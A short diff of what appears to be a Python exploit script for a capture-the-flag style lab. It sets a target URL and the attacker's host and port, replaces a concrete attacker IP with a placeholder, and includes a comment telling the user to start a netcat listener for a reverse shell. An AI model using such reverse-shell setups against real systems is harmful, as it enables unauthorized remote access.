@@ -3,7 +3,7 @@ import urllib
 import os
 
 url='http://10.10.10.168:8080/' 
-lhost = '10.10.14.8' #change this
+lhost = '10.10.14.x' #change this
 lport = '1234' 
 #make sure to set up a listener nc -lnvp 1234
 
